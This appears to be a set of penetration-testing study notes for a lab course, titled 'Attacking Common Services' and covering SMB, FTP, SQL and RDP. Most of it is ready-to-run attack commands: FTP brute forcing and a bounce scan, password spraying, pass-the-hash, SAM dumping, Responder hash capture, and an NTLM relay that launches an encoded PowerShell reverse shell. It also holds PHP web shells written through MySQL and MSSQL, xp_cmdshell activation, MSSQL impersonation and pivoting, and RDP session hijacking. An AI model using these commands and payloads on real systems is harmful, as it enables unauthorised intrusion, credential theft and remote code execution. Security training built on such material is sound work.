# Attacking Common Services

## Interacting with Common Services

### 🪟 Table 1: Windows SMB Commands & Breakdowns

This table covers both standard Command Prompt (CMD) and PowerShell utilities used to interact with Windows network shares.

| **Command / Script**                                                                                                                                                                                                                                                                                               | **Environment** | **Breakdown & Functionality**                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `dir \\192.168.220.129\Finance\`                                                                                                                                                                                                                                                                                   | **CMD**         | Lists the immediate files and subdirectories located on the remote network share.                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `net use n: \\192.168.220.129\Finance`                                                                                                                                                                                                                                                                             | **CMD**         | Connects to the remote share and maps it to the local drive letter **`N:`** using your current session's active credentials.                                                                                                                                                                                                                                                                                                                                                                          |
| `net use n: \\192.168.220.129\Finance /user:plaintext Password123`                                                                                                                                                                                                                                                 | **CMD**         | Explicitly maps the remote share to the **`N:`** drive by authenticating with the username `plaintext` and password `Password123`.                                                                                                                                                                                                                                                                                                                                                                    |
| `dir n: /a-d /s /b \\| find /c ":\"`                                                                                                                                                                                                                                                                               | **CMD**         | <p><strong><code>dir n:</code></strong>: Targets the mapped network drive.<br><br><br><br><strong><code>/a-d</code></strong>: Filters out folders, showing only files.<br><br><br><br><strong><code>/s</code></strong>: Searches recursively through all subdirectories.<br><br><br><br><strong><code>/b</code></strong>: Uses bare format (removes headers/summaries).<br><br><br><br><strong><code>\| find /c ":\"</code></strong>: Pipes the results to count the total number of items found.</p> |
| `dir n:\*cred* /s /b`                                                                                                                                                                                                                                                                                              | **CMD**         | Recursively searches the mapped **`N:`** drive for any file or directory containing the string "cred" in its name and displays them in absolute file paths.                                                                                                                                                                                                                                                                                                                                           |
| `findstr /s /i cred n:\*.*`                                                                                                                                                                                                                                                                                        | **CMD**         | <p>Inspects the text <em>inside</em> all files dynamically.<br><br><br><br><strong><code>/s</code></strong>: Searches subdirectories.<br><br><br><br><strong><code>/i</code></strong>: Ignores case sensitivities.<br><br><br><br><strong><code>cred</code></strong>: The text string target.</p>                                                                                                                                                                                                     |
| `Get-ChildItem \\192.168.220.129\Finance\`                                                                                                                                                                                                                                                                         | **PowerShell**  | The native cmdlet alternative to `dir` for reviewing remote filesystem share contents.                                                                                                                                                                                                                                                                                                                                                                                                                |
| `New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"`                                                                                                                                                                                                                                 | **PowerShell**  | Maps the network path to a temporary PowerShell network drive environment variable called **`N`**.                                                                                                                                                                                                                                                                                                                                                                                                    |
| <p><code>$username = 'plaintext'</code><br><br><br><br><code>$password = 'Password123'</code><br><br><br><br><code>$secpassword = ConvertTo-SecureString $password -AsPlainText -Force</code><br><br><br><br><code>$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword</code></p> | **PowerShell**  | Safely constructs a secure credential object wrapper (`$cred`) to handle domain authentication details inside scripts without passing naked plaintext parameters.                                                                                                                                                                                                                                                                                                                                     |
| `New-PSDrive [...] -Credential $cred`                                                                                                                                                                                                                                                                              | **PowerShell**  | Mounts the target share path cleanly by parsing the freshly generated `$cred` credential object wrapper.                                                                                                                                                                                                                                                                                                                                                                                              |
| `(Get-ChildItem -File -Recurse \\| Measure-Object).Count`                                                                                                                                                                                                                                                          | **PowerShell**  | <p>Evaluates the entire mapped root drive dynamically.<br><br><br><br><strong><code>-File</code></strong>: Ignores folders.<br><br><br><br><strong><code>-Recurse</code></strong>: Loops subdirectories.<br><br><br><br><strong><code>\| Measure-Object).Count</code></strong>: Calculates numerical tallies.</p>                                                                                                                                                                                     |
| `Get-ChildItem -Recurse -Path N:\ -Include *cred* -File`                                                                                                                                                                                                                                                           | **PowerShell**  | Drops into paths recursively, using the **`-Include`** parameter to extract individual files matching wildcard name attributes.                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ChildItem -Recurse -Path N:\ \\| Select-String "cred" -List`                                                                                                                                                                                                                                                  | **PowerShell**  | Functions like `grep` or `findstr`. It reads through internal line layouts recursively to track matches for the phrase "cred".                                                                                                                                                                                                                                                                                                                                                                        |

### 🐧 Table 2: Linux SMB Commands & Breakdowns

This table covers native Linux command-line interaction with Linux Samba configurations or Windows SMB infrastructure targets.

| **Command**                                                                                                     | **Utility / Context**  | **Breakdown & Functionality**                                                                                                                                                                                                                                                                                                                 |
| --------------------------------------------------------------------------------------------------------------- | ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo mkdir /mnt/Finance`                                                                                       | **System Preparation** | Configures a clean local host directory tree to serve as the destination mount anchor point.                                                                                                                                                                                                                                                  |
| `sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance` | **CIFS Mount Engine**  | <p><strong><code>-t cifs</code></strong>: Sets the connection driver to Common Internet File System (SMB).<br><br><br><br><strong><code>-o [...]</code></strong>: Passes options like credentials inline.<br><br><br><br><strong><code>//... /mnt/Finance</code></strong>: Maps the target network folder onto your local directory node.</p> |
| `mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile`                      | **CIFS Mount Engine**  | Achieves the exact same network mounting results but protects visibility by drawing user credentials silently out of an external configuration file.                                                                                                                                                                                          |
| `find /mnt/Finance/ -name *cred*`                                                                               | **Native Exploration** | Scans through the mounted directory structure recursively to output files or folder names featuring the word "cred".                                                                                                                                                                                                                          |
| `grep -rn /mnt/Finance/ -ie cred`                                                                               | **Content Processing** | <p><strong><code>-r</code></strong>: Reads file systems recursively.<br><br><br><br><strong><code>-n</code></strong>: Pulls specific line sequence numbers.<br><br><br><br><strong><code>-i</code></strong>: Toggles case insensitivity.<br><br><br><br><strong><code>-e</code></strong>: Marks the text target payload ("cred").</p>         |

### 🛠️ All Other Service Commands (Separated)

Beyond file storage systems, your text identifies package management commands, remote database connection utilities, and email client orchestration hooks.

#### 📦 System Setup & Management

* **`sudo apt install cifs-utils`**
  * _Use:_ Installs the vital remote system-driver extensions required for Linux platforms to successfully read and mount network-backed CIFS/SMB directory paths.
* **`sudo apt-get install evolution`**
  * _Use:_ Pulls down the core application components for the Gnome desktop alternative client interface to handle enterprise mail routing features.
* **`export WEBKIT_FORCE_SANDBOX=0 && evolution`**
  * _Use:_ Overrides initialization sandboxing bugs dynamically to launch the Evolution mail suite execution process safely inside virtualized environments.
* **`sudo dpkg -i dbeaver-<version>.deb`**
  * _Use:_ Force-installs the downloaded standalone application installer archive for the DBeaver database GUI control center interface.
* **`dbeaver &`**
  * _Use:_ Launches the cross-platform structural database suite GUI straight into the background workspace, keeping your active shell operational.

#### 🗄️ Database Interaction

* **`sqsh -S 10.129.20.13 -U username -P Password123`**
  * _Use:_ Commands an interactive command-line session from a Linux system targeting a remote Microsoft SQL Server (MSSQL) database daemon node (`-S` server, `-U` user, `-P` password).
* **`sqlcmd -S 10.129.20.13 -U username -P Password123`**
  * _Use:_ The native Windows console engine equivalent for building administrative console relationships with local or remote Microsoft SQL configurations.
* **`mysql -u username -pPassword123 -h 10.129.20.13`**
  * _Use:_ Establishes a standard Linux client command pipeline connection session into a target relational MySQL database engine endpoint (`-u` user, `-p` immediate password, `-h` host).
* **`mysql.exe -u username -pPassword123 -h 10.129.20.13`**
  * _Use:_ Executes the Windows native application wrapper engine to interact cleanly with targeted external relational MySQL network systems.

***

***

## Attacking FTP

This section details the core methodology for auditing and attacking the File Transfer Protocol (FTP) service (defaulting to TCP port 21). The tactical workflow transitions through three main phases:

1. **Initial Enumeration:** Checking for protocol misconfigurations, such as active **Anonymous Authentication**, which permits unauthenticated access to corporate data storage.
2. **Online Brute-Forcing:** Deploying dictionary attacks using multithreaded utilities (like Medusa) against specific target profiles when anonymous access is disabled.
3. **Protocol Defect Exploitation:** Leveraging legacy trust flaws via the **FTP Bounce Attack** to weaponize an intermediate FTP server as a blind proxy to port-scan isolated internal network segments.

### 📋 Comprehensive FTP Commands List

| **Context / Phase**      | **Executable Command**                                                       |
| ------------------------ | ---------------------------------------------------------------------------- |
| **Initial Footprinting** | `sudo nmap -sC -sV -p 21 192.168.2.142`                                      |
| **Interactive Login**    | `ftp 192.168.2.142`                                                          |
| **Directory Navigation** | `ls`                                                                         |
| **Directory Navigation** | `cd`                                                                         |
| **File Exfiltration**    | `get`                                                                        |
| **File Exfiltration**    | `mget`                                                                       |
| **File Infiltration**    | `put`                                                                        |
| **File Infiltration**    | `mput`                                                                       |
| **Client Manual**        | `help`                                                                       |
| **Credential Cracking**  | `medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp` |
| **Pivoted Network Scan** | `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`         |

### 🔍 Deep Dive: FTP Bounce Command Analysis

#### Target Command:

Bash

```
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

#### ❓ Why This Command is Used (The Reason)

This command executes an **FTP Bounce Attack** (`CVE-1999-0017`). It is used to map open ports on an internal, firewalled host (`172.17.0.2`) that you cannot reach directly from your attack box.

By abusing the FTP protocol's default layout—specifically the `PORT` command—you trick a public-facing intermediate FTP server (`10.10.110.213`) into opening data connections to the internal target on your behalf. This allows you to completely bypass perimeter network firewalls and dynamically profile hidden subnets while masking your original attack IP address.

#### ⚙️ Flag-by-Flag Breakdown

| **Flag Component** | **Parameter**                      | **Technical Function under the Hood**                                                                                                                                                                              |
| ------------------ | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`-Pn`**          | None                               | **Treats the host as online.** Instructs Nmap to skip the initial ICMP ping discovery phase, preventing the scan from dropping if the internal target blocks ping requests.                                        |
| **`-v`**           | None                               | **Enables verbosity.** Forces Nmap to print discoveries, connection updates, and raw protocol adjustments live to your terminal as they happen.                                                                    |
| **`-n`**           | None                               | **Disables Reverse DNS resolution.** Prevents Nmap from making external DNS queries for the IP addresses, speeding up execution and preventing leakage to network logs.                                            |
| **`-p80`**         | `80`                               | **Restricts the port target range.** Tells the proxy engine to specifically evaluate port 80 (HTTP) on the hidden internal host.                                                                                   |
| **`-b`**           | `anonymous:password@10.10.110.213` | **The Bounce Relay.** Instructs Nmap to connect to the intermediate FTP proxy using the listed credentials, hijack its outbound connection state, and route the port probe queries through its internal interface. |
| **`Target`**       | `172.17.0.2`                       | **The Hidden Target.** The final destination IP address of the isolated internal machine you want to footprint indirectly.                                                                                         |

***

***

## Attacking SMB

This section explores the comprehensive attack lifecycle against the **Server Message Block (SMB)** protocol (ports 139 and 445) across both Windows and Linux (Samba) environments. The progression maps cleanly out across three main operational phases:

1. **Unauthenticated Information Gathering (Null Sessions):** Capitalizing on misconfigured servers that do not require valid credentials to catalog disk shares, active directory structures, domain users, and file structures using tools like `smbclient`, `smbmap`, `rpcclient`, and `enum4linux-ng`.
2. **Credential Penetration & Management:** Deploying non-disruptive password-spraying campaigns across multi-host subnets via `CrackMapExec` to achieve initial authentication while avoiding defensive lockout policies.
3. **Post-Exploitation Execution & Redirection:** Weaponizing valid local administrator credentials or NTLM session tokens via the Impacket suite (`psexec`, `smbexec`, `atexec`) to force remote code execution (RCE). Alternatively, utilizing `Responder` to capture local broadcast name-resolution traffic to pull hashes out for offline cracking or active network relay maneuvers.

### 📋 Comprehensive SMB Commands Table

| **Context / Category**                | **Executable Tool Command Syntax**                                                                   |
| ------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Initial Fingerprinting**            | `sudo nmap 10.129.14.128 -sV -sC -p139,445`                                                          |
| **Null Session Checking**             | `smbclient -N -L //10.129.14.128`                                                                    |
| **Share Evaluation**                  | `smbmap -H 10.129.14.128`                                                                            |
| **Directory Navigation**              | `smbmap -H 10.129.14.128 -r notes`                                                                   |
| **Data Exfiltration**                 | `smbmap -H 10.129.14.128 --download "notes\note.txt"`                                                |
| **Data Infiltration**                 | `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`                                         |
| **RPC Endpoint Enumeration**          | `rpcclient -U'%' 10.10.110.17` _(Inside prompt: `enumdomusers`)_                                     |
| **Automated SMB Auditing**            | `./enum4linux-ng.py 10.10.11.45 -A -C`                                                               |
| **Subnet Password Spraying**          | `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`                    |
| **Interactive Binary Execution**      | `impacket-psexec administrator:'Password123!'@10.10.110.17`                                          |
| **Targeted Command Execution**        | `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` |
| **Active Session Hunting**            | `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`                |
| **Credential Storage Dumping**        | `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`                             |
| **Pass-the-Hash (PtH) Login**         | `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`                 |
| **Name Resolution Sniffing**          | `sudo responder -I ens33`                                                                            |
| **Offline Cryptography Verification** | `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`                                          |
| **Configuration Interrogation**       | `cat /etc/responder/Responder.conf \│ grep 'SMB ='`                                                  |
| **Database Relay Attack**             | `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`                                 |
| **Reverse Shell Relay Attack**        | `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABj...'`    |
| **Inbound Shell Handling**            | `nc -lvnp 9001`                                                                                      |

### 🔍 Detailed Complex Command Breakdowns

Here are the step-by-step structural breakdowns for the complex multi-flag orchestration strings found in the text.

#### 1. The Password Spraying Engine (`CrackMapExec`)

Bash

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

* **`smb`**: Tells the tool to load the module for the Server Message Block protocol.
* **`10.10.110.17`**: Specifies the standalone destination system IP address.
* **`-u /tmp/userlist.txt`**: Feeds a dictionary list of potential usernames instead of an isolated string parameter.
* **`-p 'Company01!'`**: Defines the single static password token that will be systematically tried against every user in the list sequentially.
* **`--local-auth`**: Forces the tool to authenticate against the machine's local Security Account Manager (SAM) database rather than asking a centralized Windows Domain Controller.

#### 2. Remote Binary Service Execution (`Impacket-PsExec`)

Bash

```
impacket-psexec administrator:'Password123!'@10.10.110.17
```

* **`administrator:'Password123!'`**: Declares the high-privilege credentials explicitly (`username:password`).
* **`@10.10.110.17`**: Points to the target Windows machine.
* **Under-the-Hood Mechanism:** This tool connects over port 445, checks for access to the hidden **`ADMIN$`** folder share, uploads a randomized executable service utility file there, connects to the remote RPC Service Control Manager API to install it as a temporary background process thread, and pipelines interactive input/output prompts via network named pipes.

#### 3. Passwordless Token Redirection (`Impacket-NTLMRelayX`)

Bash

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABj...'
```

* **`--no-http-server`**: Blinds the local tool instance from binding port 80/443, preventing software architecture conflicts with other web tools or proxies running on your host system.
* **`-smb2support`**: Updates the connection negotiation drivers to properly handle modern cryptographic validation environments used in Windows 10/11 and Windows Server platforms.
* **`-t 192.168.220.146`**: Sets the destination host IP to receive the captured session token.
* **`-c 'powershell -e ...'`**: Instructs the tool to drop the default SAM dumping routine. Instead, the instant the relay authenticates successfully, it executes this specified string (which contains a base64-encoded script that initiates a network connection back to an waiting listener).

***

***

## Attacking SQL

### 1. Database Discovery & Banner Grabbing

Before running attacks, an attacker must identify the database type, version, and underlying operating system architecture.

#### Ports to Remember:

* **MySQL:** Defaults to **TCP 3306**.
* **MSSQL:** Defaults to **TCP 1433** and **UDP 1434**. If configured in "hidden" mode to evade basic sweeps, it frequently runs on **TCP 2433**.

#### Nmap Analysis:

By passing `-sC` and `-sV` flags to Nmap, you force the engine to execute built-in auditing scripts. For example, the `ms-sql-ntlm-info` script can leak internal infrastructure architecture data directly from an unauthenticated port, including:

* Exact Windows Computer Name (`mssql-test`)
* Active Directory Domain Configuration Name (`HTB.LOCAL`)
* Operating System build layers (`Product_Version: 10.0.17763`)

### 🔐 2. Authentication Environments

Understanding how a database checks your password dictates how you bypass or weaponize your connection.

#### MSSQL Authentication Architectures

| **Mode**                   | **Authentication Mechanism Details**                                                                                                                                                                    |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Windows Authentication** | Integrated Security mode. Trusts the local OS or Active Directory Domain Controller to validate tokens. Users who are already logged into Windows do not present a secondary database password.         |
| **Mixed Mode**             | Dual-track security. Supports Windows accounts _and_ handles an internal database-specific registry of username/password pairs managed purely by the SQL Server engine itself (e.g., the `sa` account). |

#### 🛠️ Connecting via Different Frameworks

The text highlights a vital distinction when targeting MSSQL using Linux utilities:

* **Windows Auth Syntax:** You must supply the domain or local machine context manually using double backslashes (e.g., `sqsh -U .\\julio`).
* **SQL Auth Syntax:** Omitting the computer/domain prefix forces the tool to use internal database account matching (e.g., `mssqlclient.py julio@10.129.203.7`).
* **The Batch Terminator (`GO`):** Native command-line tools like `sqlcmd` and `sqsh` queue scripts in buffer memory. The queries do not run until you type **`GO`** on a clean line. Modern automation utilities like Impacket's `mssqlclient.py` execute instantly upon pressing Enter.

### 🗄️ 3. Information Gathering: Navigating the File System

Once authenticated, your first objective is exploring the default tables to uncover metadata or structural application layouts.

Plaintext

```
Database Context Layouts
├── MySQL Engine Schema               ├── MSSQL Engine Schema
│   ├── information_schema (Metadata) │   ├── master (Server-wide configurations)
│   ├── mysql (Core system variables) │   ├── msdb (Automation & Backup history)
│   └── sys (Performance metrics)     │   └── tempdb (Volatile execution spaces)
```

#### Essential Query Syntax Comparison

| **Operational Task** | **MySQL Syntax**       | **MSSQL Syntax**                                    |
| -------------------- | ---------------------- | --------------------------------------------------- |
| **List Databases**   | `SHOW DATABASES;`      | `SELECT name FROM master.dbo.sysdatabases;`         |
| **Switch Context**   | `USE htbusers;`        | `USE htbusers;`                                     |
| **List Tables**      | `SHOW TABLES;`         | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES;` |
| **Exfiltrate Rows**  | `SELECT * FROM users;` | `SELECT * FROM users;`                              |

### 💥 4. High-Impact Attack Methodologies

This section details how database access can be weaponized to compromise the underlying host operating system.

#### A. Host Command Execution (`xp_cmdshell`)

In MSSQL, if your account has administrative rights (`sysadmin`), you can drop directly into a Windows system console handler using the `xp_cmdshell` stored procedure.

* **The Catch:** It is disabled by default to limit exposure.
*   **The Exploit:** If you have the appropriate permissions, you can manually reconfigure the server registry variables live inside your session to spin it up: SQL

    ```
    EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
    EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    ```
* **Privilege Level:** Any system utility executed via `xp_cmdshell` runs with the exact same privilege profile as the local service account hosting the database engine (e.g., `nt authority\network service` or a dedicated service user account).

#### B. Infiltrating & Exfiltrating Local Disk Files

**1. File Writing (Dropping Web Shells)**

*   **MySQL Method:** If a database is paired with a web application server (like PHP) and the global system configuration variable `secure_file_priv` is completely empty, you can use `SELECT ... INTO OUTFILE` to generate a malicious file inside the web directory: SQL

    ```
    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    ```
* **MSSQL Method:** Requires enabling **OLE Automation Procedures** via configurations, and then executing file system scripting objects (`Scripting.FileSystemObject`) to systematically write web shell text payloads line-by-line to disk paths.

**2. Arbitrary File Reading**

*   **MSSQL:** Leveraging `OPENROWSET(BULK...)` allows low-privilege database readers to pull cleartext files straight off the underlying storage controllers: SQL

    ```
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
    ```
* **MySQL:** If administrative access and file permissions align, you can pull cleartext operating system strings into your session using `SELECT LOAD_FILE("/etc/passwd");`.

#### C. Coerced Hash Relaying (`xp_dirtree` / `xp_subdirs`)

As you practiced previously, you can pass a remote UNC share string (`\\attacker-ip\share`) into directory parsing utilities. This drops out of the database application layer and forces the host Windows OS client engine to negotiate an outbound authentication handshake over SMB port 445, leaking the **NetNTLMv2 hash** to an awaiting `Responder` or `impacket-smbserver` listener.

### 🚀 5. Privilege Escalation & Lateral Movement (MSSQL Specifics)

#### Context Impersonation (`IMPERSONATE`)

If a security administrator explicitly maps an internal `IMPERSONATE` privilege configuration to a low-privileged account, that database user can voluntarily assume the identity of another account without knowing their password.

By running the `EXECUTE AS LOGIN` command, you instantly swap your session profile context to run commands with the full authorization layer of that targeted user account:

SQL

```
-- Swap identity to the master system administrator account
EXECUTE AS LOGIN = 'sa';
-- Verify if you have successfully escalated to sysadmin status (1 = True)
SELECT IS_SRVROLEMEMBER('sysadmin');
```

_(To return back down to your default low-privileged tracking session profile, you run `REVERT;`)._

#### Pivoting Across Networks via Linked Servers

Database linking allows an asset to process data rows across completely distinct external systems. If you run a query against `sysservers` and discover a linked link entry where `isremote = 0`, you can execute pass-through commands directly into that remote server context using the `EXECUTE(...) AT` macro string:

SQL

```
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
```

If the internal connection parameters are pre-configured with inherited administrative rights, this gives you instant system administration command authority over a completely separate corporate asset, facilitating swift lateral movement inside the network.

### 1. Service Discovery & Enumeration

#### Network Banner Scanning

Used to scan the target host for open SQL services and grab version information.

Bash

```
nmap -Pn -sV -sC -p1433 10.10.10.125
```

### 2. Remote Database Connections

#### MySQL (Linux Client)

Bash

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

#### MSSQL via `sqlcmd` (Windows Client)

Using display optimizations (`-y` and `-Y`).

Bash

```
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

#### MSSQL via `sqsh` (Linux Client - SQL Authentication)

Bash

```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

#### MSSQL via `sqsh` (Linux Client - Windows Authentication)

Bash

```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

#### MSSQL via Impacket (Linux Client)

Bash

```
mssqlclient.py -p 1433 julio@10.129.203.7
```

### 3. Core Database Navigation Syntax

#### Discovering Databases / Schemas

*   **MySQL:** SQL

    ```
    SHOW DATABASES;
    ```
*   **MSSQL:** SQL

    ```
    SELECT name FROM master.dbo.sysdatabases
    GO
    ```

#### Selecting / Switching Databases

*   **MySQL:** SQL

    ```
    USE htbusers;
    ```
*   **MSSQL:** SQL

    ```
    USE htbusers
    GO
    ```

#### Listing Internal Tables

*   **MySQL:** SQL

    ```
    SHOW TABLES;
    ```
*   **MSSQL:** SQL

    ```
    SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
    GO
    ```

#### Extracting Table Records

*   **MySQL:** SQL

    ```
    SELECT * FROM users;
    ```
*   **MSSQL:** SQL

    ```
    SELECT * FROM users
    GO
    ```

### 4. Operating System Command Execution (RCE)

#### Running Commands Directly (MSSQL)

SQL

```
xp_cmdshell 'whoami'
GO
```

#### Enabling `xp_cmdshell` (MSSQL Administrative Reconfiguration)

SQL

```
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

### 5. File System Interactivity (Read/Write)

#### Writing Local Web Shell Files

*   **MySQL:** SQL

    ```
    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    ```
*   **MySQL Verification Query:** SQL

    ```
    show variables like "secure_file_priv";
    ```

#### Writing Files via OLE Automation (MSSQL)

*   **Enable OLE Engine:** SQL

    ```
    sp_configure 'show advanced options', 1
    GO
    RECONFIGURE
    GO
    sp_configure 'Ole Automation Procedures', 1
    GO
    RECONFIGURE
    GO
    ```
*   **Create and Populate File:** SQL

    ```
    DECLARE @OLE INT
    DECLARE @FileID INT
    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    EXECUTE sp_OADestroy @FileID
    EXECUTE sp_OADestroy @OLE
    GO
    ```

#### Reading Local Files

*   **MSSQL Object Reading:** SQL

    ```
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    GO
    ```
*   **MySQL Arbitrary File Loading:** SQL

    ```
    select LOAD_FILE("/etc/passwd");
    ```

### 6. Coerced Authentication (Hash Stealing)

#### Attacker Active Handshake Listeners

*   **Responder Server:** Bash

    ```
    sudo responder -I tun0
    ```
*   **Impacket SMB Server:** Bash

    ```
    sudo impacket-smbserver share ./ -smb2support
    ```

#### Database Target Trigger Queries

*   **Via `xp_dirtree`:** SQL

    ```
    EXEC master..xp_dirtree '\\10.10.110.17\share\'
    GO
    ```
*   **Via `xp_subdirs`:** SQL

    ```
    EXEC master..xp_subdirs '\\10.10.110.17\share\'
    GO
    ```

### 7. Privilege Escalation & Lateral Movement

#### Context Impersonation

*   **Identify Impersonation Targets:** SQL

    ```
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
    GO
    ```
*   **Verify Current User & Role Status:** SQL

    ```
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    GO
    ```
*   **Execute Impersonation Transition:** SQL

    ```
    EXECUTE AS LOGIN = 'sa'
    GO
    ```
*   **Revert to Original Context:** SQL

    ```
    REVERT;
    GO
    ```

#### Cross-Server Pivoting (Linked Servers)

*   **Identify Linked Targets:** SQL

    ```
    SELECT srvname, isremote FROM sysservers
    GO
    ```
*   **Pass-Through Execution Across a Link:** SQL

    ```
    EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
    GO
    ```

***

***

## Attacking RDP

### 1.RDP Session Hijacking

#### The Theory

When a user connects to a Windows machine via RDP, the operating system creates a unique **Session ID** for that user. Even if the user minimizes the window or disconnects without explicitly logging off, their session remains active in the background.

If an attacker gains local administrator access to that machine, they can intercept and hijack another logged-in user's active or disconnected graphical session. This allows the attacker to impersonate that user completely without knowing their password. If the target user is a Domain Admin or a high-privilege account, this results in instant privilege escalation.

#### The Information & Execution

To pull this off, the attacker leverages a legitimate built-in Windows utility called `tscon.exe` (Terminal Services Connect).

* **The Catch:** To use `tscon.exe` to hijack a session without being prompted for the user's password, the command must be run with **SYSTEM privileges**, not just Administrator privileges.
*   **The Execution Method:** 1. The attacker queries the active sessions using `query user` to identify the target's `SESSIONID`.

    2. They elevate from Administrator to SYSTEM by creating a malicious Windows Service using `sc.exe`. Windows services run as `Local System` by default.
    3. The service executes a command telling `tscon.exe` to connect the target's Session ID to the attacker's current session name:

    ```
    cmd sc.exe create sessionhijack binpath= "cmd.exe /k tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]" net start sessionhijack
    ```

    ```
    C:\htb> query user 
    USERNAME SESSIONNAME ID STATE IDLE TIME      LOGON TIME 
    >juurena rdp-tcp#13  1  Active 7  8/25/2021  1:23 AM 
    >lewen rdp-tcp#14 2 Active * 8/25/2021 1:28 AM 
    C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13" 
    [SC] CreateService SUCCESS
    ```
* **Limitation:** This specific trick utilizing `tscon.exe` via a service without a password prompt has been mitigated and **no longer works by default on Windows Server 2019/2022**.

### 2. RDP Pass-the-Hash (PtH)

#### The Theory

Normally, RDP requires you to enter a plaintext password because the protocol needs to negotiate a complete interactive desktop environment. However, during penetration tests, security researchers often dump the Windows SAM database or LSASS memory and obtain an **NTLM hash** instead of a cleartext password.

A Pass-the-Hash attack allows an attacker to authenticate to a remote service using only the username and the NTLM hash, skipping the need to crack or guess the actual password. To allow this graphical environment over RDP via a hash, Windows relies on a feature called **Restricted Admin Mode**.

#### The Information & Execution

When Restricted Admin Mode is utilized, the client machine does not send the password to the target machine. Instead, it uses standard network challenge-response authentication (like NTLM), meaning the NTLM hash alone is sufficient to log in.

* **The Catch:** Restricted Admin Mode is **disabled by default** on Windows systems. If an attacker tries to pass the hash without it being enabled, the connection will fail with an account restriction error.
*   **The Prerequisite:** If the attacker already has a command-line shell on the target (or can modify the registry remotely), they must enable Restricted Admin Mode by adding a specific registry key: DOS

    ```
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    ```
*   **The Execution Method:** Once enabled on the target, tools like `xfreerdp` can be executed from a Linux attacking machine using the `/pth` flag followed by the NTLM hash: Bash

    ```
    xfreerdp /v:[TARGET_IP] /u:[USERNAME] /pth:[NTLM_HASH]
    ```

    This spawns a full GUI desktop session without ever requiring the cleartext password.

### Summary Comparison

| **Attack Type**             | **Goal**                             | **Core Prerequisite**                              | **Tool Used**                 | **Primary Limitation**                                          |
| --------------------------- | ------------------------------------ | -------------------------------------------------- | ----------------------------- | --------------------------------------------------------------- |
| **RDP Session Hijacking**   | Privilege Escalation / Impersonation | Local Admin access; Target user must be logged in. | `tscon.exe`, `sc.exe`         | Patched/Mitigated on Windows Server 2019+                       |
